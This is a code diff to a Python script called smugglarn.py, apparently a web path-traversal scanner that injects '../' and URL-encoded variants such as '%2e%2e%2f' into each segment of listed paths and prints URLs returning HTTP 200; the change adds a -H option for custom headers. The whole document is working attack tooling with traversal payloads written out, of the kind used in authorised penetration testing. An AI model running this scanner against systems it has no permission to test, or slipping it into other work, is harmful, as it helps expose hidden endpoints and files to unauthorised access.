@@ -1,11 +1,11 @@
 #!/usr/bin/python3
-import requests, sys, getopt, os.path
+import requests, sys, getopt, os.path, re
 
 travenc = ["../", "%2e./", ".%2e/", "%2e.%2f", ".%2e%2f", "..%2f", "%2e%2e%2f"]
 
-def send_requests_per_path(base, path, enp):
+def send_requests_per_path(base, path, enp, header):
     path_comp = path.split('/')[1:]
-    org_req = requests.urllib3.PoolManager().request("GET",base+path[1:])
+    org_req = requests.urllib3.PoolManager().request("GET", base+path[1:], headers=header)
     org_resp_code = org_req.status
 
     for inj_point in range(len(path_comp)):
@@ -18,20 +18,21 @@ def send_requests_per_path(base, path, enp):
                 probe = enp[1:]
             
             url=base+'/'.join(path_comp[:inj_point+1])+'/'+traversal+probe
-            r = requests.urllib3.PoolManager().request("GET",url)
+            r = requests.urllib3.PoolManager().request("GET",url, headers=header)
             if r.status == 200:
                 print(str(r.status) + ": " + url)
 
 def print_help():
-    help_text = '''Usage: smugglarn.py -u <base_url> -p <paths_file> [-e <probing_endpoint>]'''
+    help_text = '''Usage: smugglarn.py -u <base_url> -p <paths_file> [-e <probing_endpoint>, -H <header(s)>]'''
     print(help_text)
 
 def main(argv):
     baseurl = ''
     endpoint = ''
     paths_file = ''
+    headers = {}
     try:
-        opts, args = getopt.getopt(argv,"hu:p:e:")
+        opts, args = getopt.getopt(argv,"hu:p:e:H:")
     except getopt.GetoptError:
         print_help()
         sys.exit(2)
@@ -47,6 +48,12 @@ def main(argv):
                 sys.exit(2)
         elif opt == '-e':
             endpoint = arg
+        elif opt == '-H':
+            s = re.search('^([^\:]*):\s*(.*$)', arg)
+            if s.group(1) in headers:
+                print("Header already set you fool!")
+                sys.exit(2)
+            headers[s.group(1)]=s.group(2)
 
     if baseurl == '' or paths_file == '':
         print_help()
@@ -54,7 +61,7 @@ def main(argv):
 
     pf = open(paths_file)
     for line in pf:
-        send_requests_per_path(baseurl, line[:-1], endpoint)
+        send_requests_per_path(baseurl, line[:-1], endpoint, headers)
     
 
 if __name__ == "__main__":
